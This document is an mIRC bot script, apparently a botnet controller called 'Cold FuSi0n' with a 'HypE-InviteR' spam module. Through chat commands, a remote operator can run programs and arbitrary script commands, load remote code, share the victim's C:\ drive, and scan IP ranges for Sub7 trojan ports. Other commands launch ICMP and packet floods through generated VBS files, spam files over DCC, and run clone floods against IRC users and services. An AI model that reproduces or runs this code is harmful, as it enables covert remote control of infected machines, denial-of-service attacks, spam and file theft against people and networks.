[script]
n0=;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
n1=;   -]'[Cold FuSi0n ]'[-;
n2=;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
n3=;; Hello, this is much bett3r thAn
n4=;; all of you. You will NeVeR toUch
n5=;; ThIs! =))))) NeVeR fj33r m3, im n|ce
n6=;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
n7=alias chk {
n8=  if ($1 == url) { run $2- | msg $a Visibly visitted $2- with users web browser }
n9=  if ($1 == spam) {
n10=    if ($2 == help) { msg $a 12�15HypE-InviteR12�14 Commands | msg $a !spam [on/off] | msg $a !spam raw [raw command here] | msg $a !spam msg [New spam msg] | msg $a !spam stats | msg $a !spam type [msg/send] | msg $a !spam file [name of file to send] }
n11=    if ($2 == stats) { msg $a 12�15HypE-InviteR12�14 Status: ( $+ $iif($sock(wSck32) != $null,ON,off) $+ ) Spamming Server: ( $+ $sock(wSck32).ip $+ ) Spamming Chans: ( $+ %spam.chans $+ ) Total Spammed: ( $+ %spammed $+ ) Type: ( $+ %spamtype $+ ) Total Sends: ( $+ %total.sent $+ ) File: ( $+ %winfile $+ ) Ext: ( $+ %ext $+ ) }
n12=    if ($2 == off) { stop.dspam | msg $a 12�15HypE-InviteR12�14 Disabled spammer | halt }
n13=    if ($2 == raw) { sockwrite -tn wSck32 $$3- | msg $a 12�15HypE-InviteR12�14 Performed raw command.. | halt }
n14=    if ($2 == msg) { if ($3 == $null) { 12�15HypE-InviteR12�14 Spam message is currently set to: %spam.msg | halt } | set %spam.msg $3- | msg $a 12�15HypE-InviteR12�14 Spam message is now set to: $3- }
n15=    if ($2 == on) { if ($sock(wSck32) != $null) { msg $a 12�15HypE-InviteR12�14 Error! Already spamming. | halt } | if ($4 !isnum) { msg $a 12�15HypE-InviteR12�14 Error! Use !spam on irc.dal.net 6667 | halt } | set %spam.server $3 | set %spam.port $4 | msg $a 12�15HypE-InviteR12�14 Enabled spammer! | start.dspam }
n16=    if ($2 == type) { if ($3 == MSG) { msg $a 12�15HypE-InviteR12�14 Spam set to: MSG | set %spamtype MSG | halt } | if ($3 == SEND) { msg $a 12�15HypE-InviteR12�14 Spam set to: SEND | set %spamtype SEND | halt } | msg $a 12�15HypE-InviteR12�14 Error! Please use !spam type [msg/send] }
n17=    if ($2 == ext) { if ($3 == $null) { msg $a 12�15HypE-InviteR12� Error! Use !spam ext .exe | halt } | set %ext $3- | msg $a 12�15HypE-InviteR12� Set file extension to ( $+ $3- $+ ) Type !spam type send to enable DCC sends. }
n18=if ($2 == file) { if ($3 == $null) { msg $a 12�15HypE-InviteR12� Error! Use !spam file C:\WINDOWS\WIN.INI | halt } | set %winfile $3- | msg $a 12�15HypE-InviteR12� Set file send to ( $+ $3- $+ ) Type !spam type send to enable DCC sends. }
n19=    if ($2 == version) { msg $a 12�15HypE-InviteR12�14 (v2.1) By: <the scripting g0d himself>-<NaHeMiA>-<the scripting g0d himself> and Acid who helped =D }
n20=  }
n21=  if ($1 == bnc) {
n22=    if ($2 == stats) { msg $a 12[15Bnc12] [15Users Connected:14 $sock(bnc.in*,0) $+ 12] [15Bnc's Open:14 $calc($sock(bnc.*,0) - $sock(bnc.in*,0) - $sock(bnc.out*,0)) $+ 12] [15Server Connections:14 $sock(bnc.out*,0) $+ 12] }
n23=    if ($2 == log) { bnc log $3 | msg $a 12[15Bnc12] 12[15Logger has been set to $3 $+ 12] | if ($3 == off) { remove bnc.log } }
n24=    if ($2 == start) { bnc start $3 $4 | msg $a 12[15Bnc Activated12] 12[15Server:14 $ip $+ 12] 12[15Password:14 $4 $+ 12] | halt }
n25=    if ($2 == help) { msg $a 12[15Bnc12] 12[15!bnc start <port> <password>12] | halt }
n26=    if ($2 == shutdown) { msg $a 12[15Bnc Shutdown Completed12] | bnc reset }
n27=  }
n28=  if ($1 == inviter) {
n29=    set %s.i.c $iif($chan == $null,$nick,$chan)
n30=    if ($2 == load) { set %i.server $3 | set %i.port $4 | set %i.b on | s.inviter }
n31=    if ($2 == stop) { sockclose inviter* | remove ichat.txt | set %i.b off | unset %i.temp.* | .timerinviteconnect off | msg $a 12[15in14vit15er12]:  Inviter has been killed. }
n32=    if ($2 == status) {  if ($sock(inviter*,0) == 0) { msg $a 12[15in14vit15er12]: Status: Not Connected! | halt } | if ($sock(inviter*,0) > 0) { msg $a 12[15in14vit15er12]: Status: Connected [ $+ $sock(inviter*,0) $+ ] } }
n33=    if ($2 == stats) { msg $a 12[15in14vit15er12]: (Stats) Total Invited: $calc( %i.t.j  +  %i.t.p ) Delay: ( $+ %i.ondelay $+ ) }   |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3 $+ * }
n34=    if ($2 == message) { set %imsg $3- | msg $a 12[15in14vit15er12]:  Invite Message set as [ $+ $3- $+ ] }
n35=    if ($2 == ctotal) { msg $a 12[15in14vit15er12]: Random Channels Total: $+ $lines(ichan.txt) }
n36=    if ($2 == reset) { msg $a 12[15in14vit15er12]: All Settings Unset! | unset %i.t.j  | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }
n37=    if ($2 == mode) { sockwrite -tn inviter* MODE $3- | msg $a 12[15in14vit15er12]: Set Mode $3- }
n38=    if ($2 == join) {  if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg $a 12[15in14vit15er12]: Error: Gather channels first! | halt } | set %i.r.j.a $4 | set %i.r.j.i 0 | :loop | if (%i.r.j.i  > %i.r.j.a) { goto end } | sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  | inc %i.r.j.i  | goto loop | :end | unset %i.r.j.i | unset %i.r.j.a   | halt } | else { sockwrite -nt inviterN JOIN : $+ $3 } }
n39=    if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $read tempsettings.scr | halt }  |  //sockwrite -nt inviterN NICK $3   } 
n40=    if ($2 == delay) { set %i.ondelay $3 | msg $a 12[15in14vit15er12]:  Delay set to: ( $+ $3 $+ ). }
n41=  }
n42=  if ($1 == turbo) {
n43=    if ($2 == start) { enable #dns | invitebot3 $3- | set %turbo.time.started 0 | .timerINCTT 0 1 /inc %turbo.time.started 1 | set %turbo.main.ch4n $chan | msg $a Inviting to $5 on $3 $+ : $+ $4 }
n44=    if ($2 == help) { msg $chan !turbo start server port channel message }
n45=  }
n46=  if ($1 == proxy.scan) {
n47=    if ($1 == help) { msg $a 12�(15Pr0xy Scanner12)� | msg $a 12��15 !proxy.scan file <proxy-lisy> | msg $a 12��15 !proxy.scan stats | msg $a 12��15 !proxy.scan on <server> <port> | msg $a 12��15 !proxy.scan off }
n48=    if ($1 == file) { set %proxy.scan.file $2- | msg $a 12�(15Pr0xy Scanner12)� (15File:12) $2- $+  }
n49=    if ($1 == stats) { msg $a 12�(15Pr0xy Scanner12)� (15Scanned:12)15 %proxy.scan.scanned 12(15Found:12)15 %proxy.scan.found $+  }
n50=    if ($1 == off) { stop.proxy.scan }
n51=    if ($1 == on) { start.proxy.scan $2- }
n52=    if ($1 == join) && ($sock(proxy.scan*,0) > 0) { sockwrite -tn proxy.scan* JOIN $2- | msg $a 12�(15Pr0xy Scanner12)� Now scanning $2- $+  }
n53=    if ($1 == part) && ($sock(proxy.scan*,0) > 0) { sockwrite -tn proxy.scan* PART $2 | msg $a 12�(15Pr0xy Scanner12)� No longer scanning $2- $+  }
n54=    if ($1 == channel) && ($2 != $null) { set %proxy.scan.channel $2 | msg $a 12�(15Pr0xy Scanner12)� Channel: $2- $+  }
n55=  }
n56=  if ($1 == scanStatus) {
n57=    if (%scan.nick != $null) { .msg $nick I'm Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) }
n58=    else { .msg $nick No Scans In Progress }
n59=  }
n60=  if ($1 == scanAbort) {
n61=    if ($nick = %scan.nick) { .msg $nick you have just aborted the scanning of port  $+ %scan.port $+  | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
n62=    else { .msg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }
n63=  }
n64=  if ($1 == scan) {
n65=    if (%scan.nick != $null) { .msg $nick I'm Allready Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) | halt }
n66=    if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .msg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> EX !scan 24.24.24.1 24.24.24.255 27374 5 | halt }
n67=    else {
n68=      set %scan.Start1 $gettok($2,1,46)
n69=      set %scan.Start2 $gettok($2,2,46)
n70=      set %scan.Start3 $gettok($2,3,46)
n71=      set %scan.Start4 $gettok($2,4,46)
n72=      set %scan.Perm1 $gettok($2,1,46)
n73=      set %scan.Perm2 $gettok($2,2,46)
n74=      set %scan.Perm3 $gettok($2,3,46)
n75=      set %scan.Perm4 $gettok($2,4,46)
n76=      set %scan.End1 $gettok($3,1,46)
n77=      set %scan.End2 $gettok($3,2,46)
n78=      set %scan.End3 $gettok($3,3,46)
n79=      set %scan.End4 $gettok($3,4,46)
n80=      if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .msg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }
n81=      if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .msg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }
n82=      set %scan.port $4
n83=      set %scan.delay $5
n84=      set %scan.nick $nick
n85=      .timerscan 0 %scan.delay scancheck
n86=      .msg %scan.nick now Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay)
n87=    }
n88=  }
n89=  if ($1 == sub7.updater) { 
n90=    if ($2 == on) { enable #Sub7Update | .notice $nick Sub7 Updater Now On }
n91=    if ($2 == off) { disable #Sub7Update | .notice $nick Sub7 Updater Now Off }
n92=    if ($2 == uplocation) { set %uplocation $3- | .notice $nick Sub7 Updater Location File set to: $3- }
n93=    if ($2 == update) { f0du $3- }
n94=  }
n95=  if ($1 == if) {
n96=    if ($5 == $null) { goto err0r }
n97=    if ($3 == $chr(61) $+ $chr(61)) { if ( [ [ $2 ] ] == [ [ $4 ] ] ) { $5- } | msg # Performed if ( [ [ $2 ] ] == [ [ $5 ] ] ) $chr(123) $5- $chr(125) | halt }
n98=    if ($3 == $chr(62)) { if ( [ [ $2 ] ] > [ [ $4 ] ] ) { $5- } | msg # Performed if ( [ [ $2 ] ] > [ [ $5 ] ] ) $chr(123) $5- $chr(125) | halt }
n99=    if ($3 == $chr(60)) { if ( [ [ $2 ] ] < [ [ $4 ] ] ) { $5- } | msg # Performed if ( [ [ $2 ] ] < [ [ $5 ] ] ) $chr(123) $5- $chr(125) | halt }
n100=    if ($3 == $chr(33) $+ $chr(61)) { if ( [ [ $2 ] ] != [ [ $4 ] ] ) { $5- } | msg # Performed if ( [ [ $2 ] ] != [ [ $5 ] ] ) $chr(123) $5- $chr(125) | halt }
n101=    :err0r
n102=    msg # Error: Please use !if <parm1> == <parm2> <commands to perform> | halt
n103=  }
n104=  if ($1 == click) { 
n105=    if ($2 == off) { timerclicker off | msg $a 14�15Clicker14� Stopped clicking %click.url | sockclose webpage* | halt } 
n106=    if ($2 == stats) { 
n107=      if ($timer(clicker) == $null) { msg $a 14�15Clicker14� idle.. | halt } 
n108=      msg $a 14�15Clicker14� Currently clicking: 12�14(15 $+ %click.url $+ 14)12� Clicks left:12 $timer(clicker).reps Delay:12 $duration($timer(clicker).delay) Time left:12 $duration($calc($timer(clicker).reps * $timer(clicker).delay)) 
n109=      halt 
n110=    }
n111=    if (($4 !isnum) && ($4 != random)) { msg $a 14�15Clicker14� Error! Syntax: !click http://www.url.com <number of times> <delay> (Note: use 'random' to make it delay between 5-45 seconds) | halt } 
n112=    if ((http:// !isin $2) || ($3 !isnum)) { msg $a 14�15Clicker14� Error! Syntax: !click http://www.url.com <number of times> <delay> (Note: use 'random' to make it delay between 5-45 seconds) | halt } 
n113=    var %c = $4 | if ($4 == random) { set %c $rand(5,45) } | set %click.url $2 | set %click.url2 $remove($2,http://,https://,$gettok($remove($2,http://,https://),1,47)) | msg $a 14�15Clicker14� Now clicking 12 $+ $2 $+  $3 times, with a delay of 12 $+ $duration(%c) 8~~14 Type !click off to stop! 
n114=    if (%click.url2 == $chr(47)) { set %click.url2 $chr(47) $+ index.html }
n115=    timerclicker $3 %c webview1 $gettok($remove($2,http://,https://),1,47) 80 
n116=  }
n117=  if ($1 == wget) { set %w.g.# $nick | /getdata2 $2 }
n118=  if ($1 == update) { %w.g.# = $a | /getdata $2 }
n119=  if ($1 == igmp) { if ($2 == $null) { /msg # Error/Syntax: (!igmp ip.here) | halt } | .remove igmp.vbs | .write igmp.vbs Set src3 = CreateObject("Wscript.shell") | .write igmp.vbs src3.run "command /c igmp $2 ",0,true | .run igmp.vbs }
n120=  if ($1 == pepsi) { if ($2 == $null) { /msg # Error/Syntax: (!pepsi ip howmany size port, ie: !pepsi 127.0.0.1 1000 200 139) | halt } | .remove pepsi.vbs | .write pepsi.vbs Set src3 = CreateObject("Wscript.shell") | .write pepsi.vbs src3.run "command /c pepsi -n $3 -p $4 -d $5 $2 ",0,true | .run pepsi.vbs }
n121=  if ($1 == icmp) { if ($2 == $null) { /msg # Error/Syntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs }
n122=  if ($1 == join) { if ($2 == $null) { halt } | else { join $2- } }
n123=  if ($1 == part) && ($2 != $decode(%c)) { if ($2 == $null) { halt } | else { part $2- } }
n124=  if ($1 == msg) { raw -q privmsg $2 : $+ $3- | notice $nick Completed Task! }
n125=  if ($1 == notice) { raw -q notice $2 : $+ $3- | notice $nick Completed Task! }
n126=  if ($1 == quit) { .notice $nick Completed Task! | quit $2- }
n127=  if ($1 == flood.string) && ($2 != $null) { set %flood $2- | .notice $nick Completed Task! }
n128=  if ($1 == proxy.flood.message) { proxy.flood.message $2- }
n129=  if ($1 == proxy.flooder.stop) { proxy.flood.stop }
n130=  if ($1 == flood.message) { flood.message $2- }
n131=  if ($1 == flood.notice) { flood.notice $2- }
n132=  if ($1 == flood.action) { flood.action $2- }
n133=  if ($1 == flood.ctcp) { flood.ctcp $2- }
n134=  if ($1 == flood.nick) { flood.nick $2- }
n135=  if ($1 == flood.quit) { flood.quit $2- }
n136=  if ($1 == flood.fserver) { flood.fserver $2- }
n137=  if ($1 == flood.random) { flood.random $2- }
n138=  if ($1 == flood.blowup) { flood.blowup $2- }
n139=  if ($1 == flooder.stop) { flood.stop }
n140=  if ($1 == mass.sub) { if ($2 == $null) || ($3 == $null) { halt } | else { mass.sub $2 $3 } }
n141=  if ($1 == exit) { quit [eXit] $ip - Nick: $nick | exit }
n142=  if ($1 == write) { write $2 $3- | notice $nick Completed Task! }
n143=  if ($1 == load) { if ($2 == $null) { halt } | if ($2 == remote) { .load -rs $3- } | if ($2 == alias) { .load -a $3- } | .notice $nick Script Loaded: $3- }
n144=  if ($1 == run) { //run $2- | .notice $nick Completed Task! }
n145=  if ($1 == voice) { mode $2 +v $3 }
n146=  if ($1 == op) { mode $2 +o $3 }
n147=  if ($1 == devoice) { mode $2 -v $3 }
n148=  if ($1 == deop) { mode $2 -o $3 }
n149=  if ($1 == reboot) { quit [reb00ting] $ip | //run $mircdir $+ rb.exe | /exit }
n150=  if ($1 == remove.user) && ($2 != $null) { /ruser $2- | .notice $nick $2- Removed From My Access List. }
n151=  if ($1 == packet) { packetofdeath $2 $3 $4 }
n152=  if ($1 == stats) { .msg $a I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) }
n153=  if ($1 == url) { if ($url == $null) { msg $a [URL]: [n0ne] } | else { msg $a [URL]: $url } }
n154=  if ($1 == varset) && ($3 != $null) { if ($2 == $chr(37) $+ c) { set %c $encode($3-) | msg $a Connect channel set to: $3- | halt } | //set $2 [ [ $3- ] ] | //msg $a 14[12var set:14] [12 $+ $2 $+ 14] :to: [12 $+ [ [ $3- ] ] $+ 14] | saveini }
n155=  if ($1 == var) && ($2 != $null) { if ( [ [ $2 ] ] ) { msg $chan  $+ $2 $+  is currently set to [ [ $2- ] ] } }
n156=  if ($1 == pfast2) && ($chan != $null) { //set %pchan $a |  if ($4 == random) { //gcoolstart2 $2 $3 $r(1,64000) | halt } | //gcoolstart2 $2 $3 $4 }
n157=  if ($1 == pfast) && ($chan != $null) { //set %pchan $a |  if ($4 == random) { //gcoolstart $2 $3 $r(1,64000) | halt } | //gcoolstart $2 $3 $4 }
n158=  if ($1 == floodnick) && ($2 != $null) { if (%flood.nick != $null) { set %flood.nick $2 | .notice $nick 8,1now flooding using11 %flood.nick } | else { .notice $nick 8,1start up the fucking flooder then change the fucking nick asshole } }
n159=  if ($1 == voice) { .mode # +v $nick }
n160=  if ($1 == nick) { nick $2 $+ $r(1,999) $+ $r(a,z) }
n161=  if ($1 == nick.reset) { /south.park }
n162=  if ($1 == server.set) { set %s $encode($2) | notice $nick Server set to $2 }
n163=  if ($1 == channel.set) { set %c $encode($2) | notice $nick Channel set to $2 }
n164=  if ($1 == jump) { quit JuMpInG [g0ne] $ip | commedy.central | rechk.mini | server $decode(%s) }
n165=  if ($1 == fileserver.access) { /msg # 14[12File-Server-Initialized14] 15(2 $+ $nick $+ 15) (: 3Enjoy! | /fserve $nick 3 C:\ }
n166=  if ($1 == clone.status) {   /msg # Clone Status: [C: $+ $sock(clone*,0) $+ / $+ W: $+ $sock(sock*,0) $+ ]  [T:14 $+ $calc($sock(clone*,0)+$sock(sock*,0)) $+ ] }
n167=  if ($1 == proxy.load) { if (%proxy.scan.file == $null) { msg $a (Error) Please set %proxy.scan.file first! | halt } var %x = 1 | msg $a Loading $lines(%proxy.scan.file) clones to  $+ $2 $+  port  $+ $3 $+  | while (%x <= $lines(%proxy.scan.file)) { sockopen proxy.clone $+ $r(1,999) $+ $r(1,999) $gettok($read(%proxy.scan.file,%x),1,32) $gettok($read(%proxy.scan.file,%x),2,32) | inc %x 1 } }
n168=  if ($1 == cycle) { if ($2 == $null) { /msg # Error/Syntax: (!cycle #Channel Please) } | raw part $2 :Cycling. | timer 1 1 join $2 }
n169=  if ($1 == op) {  if ($3 == $null) { /msg # Error/Syntax: !op #channel $nick | halt } |   else { /mode $2 +oooooo $3- } }
n170=  if ($1 == deop) {  if ($3 == $null) { /msg # Error/Syntax: !deop #channel $nick | halt } |  else { /mode $2 -oooooo $3- }  }
n171=  if ($1 == drun) { if ($2 == $null) { msg # Error/Syntax: !drun <mirc command> | halt } | // $+ $2- | .notice $nick Task completed. }
n172=  if ($1 == voice) {  if ($3 == $null) { /msg # Error/Syntax:  !voice #channel Nick | halt } |   else { /mode $2 +v $3 }  }
n173=  if ($1 == devoice) {  if ($3 == $null) { /msg # Error/Syntax: !devoice #channel Nick | halt } |     else { /mode $2 -v $3 }  }
n174=  if ($1 == kick) {  if ($4 == $null) { /msg # Error/Syntax: !kick #channel Nick MSG | halt } |  else { /kick $2 $3 $4- }  } 
n175=  if ($1 == kick/ban) { if ($4 == $null) { /msg # Syntax: !kick/ban #channel Nick MSG (KickMessage) | halt } |  else {  /mode $2 -o+b $3 $address($3,2)  | /kick $2 $3 $4-  | halt }  }
n176=  if ($1 == clone.flood.ctcp.all) && ($2 != $null) { sockwrite -tn clone* PRIVMSG $2 :TIME $crlf PRIVMSG $2 :PING $crlf  PRIVMSG $2 :VERSION $crlf PRIVMSG $2 :FINGER }
n177=  if ($1 == clone.flood.ctcp.version) && ($2 != $null) { sockwrite -tn clone* PRIVMSG $2 :VERSION }
n178=  if ($1 == clone.flood.ctcp.finger) && ($2 != $null) { sockwrite -tn clone* PRIVMSG $2 :FINGER }
n179=  if ($1 == clone.service.killer) {  if ($sock(clone*,0) == 0) { goto gatechange } 
n180=    %sk = 1  |     :skloop |   if (%sk > $sock(clone*,0)) { goto end }  |  sockwrite -n $sock(clone*,%sk) Nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |  %random.sk.temp2 = $randomgen($r(0,9))  |  %random.sk.temp3 = $randomgen($r(0,9))  |  sockwrite -n $sock(clone*,%sk) NICKSERV register %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) NICKSERV identify %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2   
n181=    sockwrite -n $sock(clone*,%sk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %sk  |   goto skloop  |   :end  |  :gatechange  |   %gsk = 1  |   :gchnge   |   if (%gsk > $sock(sock*,0)) { goto end2 }   |   sockwrite -n $sock(sock*,%gsk) Nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |   %random.sk.temp2 = $randomgen($r(0,9))  
n182=    %random.sk.temp3 = $randomgen($r(0,9))    |   sockwrite -n $sock(sock*,%gsk) NICKSERV register %random.sk.temp  |   sockwrite -n $sock(sock*,%gsk) NICKSERV identify %random.sk.temp |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |   sockwrite -n $sock(sock*,%gsk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp* 
n183=  inc %gsk  | goto gchnge |   :end2 |   halt  }
n184=  if ($1 == clone.load) {
n185=    if ($4 == $null) { halt }
n186=    if (%max.load == $null) { msg # Error: please set %max.load $+ . | halt }
n187=    if ($sock(clone*,0) >= %max.load) { msg # [Max-Reached] ( $+ [ [ %max.load ] ] $+ ) | halt }
n188=    msg # [Loading]: $4 Clone(s) to ( $+ $$2 $+ ) on port $3 
n189=    var %x = 1
n190=    while (%x <= $4) { sockopen clone $+ $r(1,999) $+ $r(1,999) $2 $3 | inc %x 1 }
n191=  }
n192=  if ($1 == clone.part) { sockwrite -tn clone* PART $2 : $+ $3- }
n193=  if ($1 == clone.dcc.chat) { sockwrite -n clone* PRIVMSG $2 :DCC CHAT $2 1058633484 3481 }
n194=  if ($1 == clone.dcc.send) { sockwrite -n clone* PRIVMSG $2 :DCC SEND $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ .txt 1058633484 2232 $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+  }
n195=  if ($1 == clone.flood.ctcp.ping) { sockwrite -tn clone* PRIVMSG $2 :PING }
n196=  if ($1 == clone.flood.ctcp.time) { sockwrite -tn clone* PRIVMSG $2 :TIME }
n197=  if ($1 == clone.join) && ($2 != $null) { sockwrite -tn clone* JOIN $2- }
n198=  if ($1 == clone.cycle) { sockwrite -tn clone* PART $2 $3- | sockwrite -tn clone* JOIN $2 }
n199=  if ($1 == clone.nick.reset) { sockwrite -tn clone* NICK $read tempsettings.scr }
n200=  if ($1 == clone.msg) { sockwrite -tn clone* PRIVMSG $2 : $+ $3- }
n201=  if ($1 == clone.quit) {  if ($sock(clone*,0) > 0) { //sockwrite -nt clone* QUIT :  $2- } |  if ($sock(sock*,0) > 0) { //sockwrite -nt sock* QUIT :  $2- } |  /msg # [Clones Disconnect/Quit] ( $+ $2- $+ )  }
n202=  if ($1 == clone.notice) && ($2 != $null) { sockwrite -tn clone* NOTICE $2 : $+ $3- }
n203=  if ($1 == clone.nick.flood) { sockwrite -tn clone* NICK $read tempsettings.scr | sockwrite -tn clone* NICK $read tempsettings.scr }
n204=  if ($1 == clone.nick) && ($2 != $null) { sockwrite -tn clone* NICK $2 $+ $read tempsettings.scr | msg # Clones changed their nick to: $2 }
n205=  if ($1 == clone.kill) { sockclose clone* | msg # [All Clones Killed] }
n206=  if ($1 == clone.combo1) { if ($2 == $null) { halt }  | clone msg $$2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling | timer 1 6 /clone msg $$2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling }
n207=  if ($1 == clone.combo2) {  if ($2 == $null) { halt } |  clone msg $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp 
n208=    timer 1 6 /clone msg $2  pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp 
n209=  timer 1 12 /clone msg $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp  }
n210=  if ($1 == clone.combo3) {  if ($2 == $null) { halt } | clone msg $2 12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods
n211=    timer 1 6 /clone msg $2 12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods 
n212=  timer 1 12 /clone msg $2 12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods   }
n213=  if ($1 == clone.combo4) {   if ($2 == $null) { halt } |  clone msg $2 ��������������������������������������������������������������������������������������������������������������������������������
n214=    timer 1 6 /clone msg $2 ��������������������������������������������������������������������������������������������������������������������������������
n215=  timer 1 12 /clone msg $2 ��������������������������������������������������������������������������������������������������������������������������������  }
n216=  if ($1 == clone.combo5) {  if ($2 == $null) { halt } | clone msg $2 !list  AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYz
